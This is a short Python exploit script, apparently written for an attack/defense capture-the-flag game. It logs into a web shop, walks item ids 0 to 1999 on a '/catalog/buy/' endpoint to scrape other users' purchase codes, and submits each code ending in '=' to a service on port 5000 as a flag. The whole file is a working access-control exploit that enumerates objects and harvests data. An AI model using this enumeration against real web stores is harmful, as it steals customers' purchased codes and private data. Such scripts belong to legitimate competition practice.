from pwn import *
import requests
from pynetcat import pynetcat

ip = ''

login_url = f"http://{ip}/login"

unique_token = ''


with requests.Session() as s:
    log_data = {
        "name": "ABOBA",
        "password": "GIGACHAD"
    }
    login_response = s.post(login_url, data=log_data)
    conn = remote(ip, 5000)
    for i in range(2000):
        buy = s.get(f'http://{ip}/catalog/buy/{i}')
        print(buy.text[buy.text.find('Code: ') + 6: buy.text.find('Code: ') + 38])
        flag = buy.text[buy.text.find('Code: ') + 6: buy.text.find('Code: ') + 38]
        
        if flag[-1] == '=':
            nc = pynetcat()
            host = ip
            port = 5000
            nc.connect(host,port)
            a = nc.receive(8192).decode()
            print(a)
            b_1 = "2"
            nc.sendLine(b_1.encode())
            print(nc.receive(8192).decode())
            b_2 = "2"
            nc.sendLine(b_2.encode())
            print(nc.receive(8192).decode())
            nc.sendLine(unique_token.encode())
            nc.receive(8192).decode()
            nc.sendLine(str(flag).encode())
            print(nc.receive(8192).decode())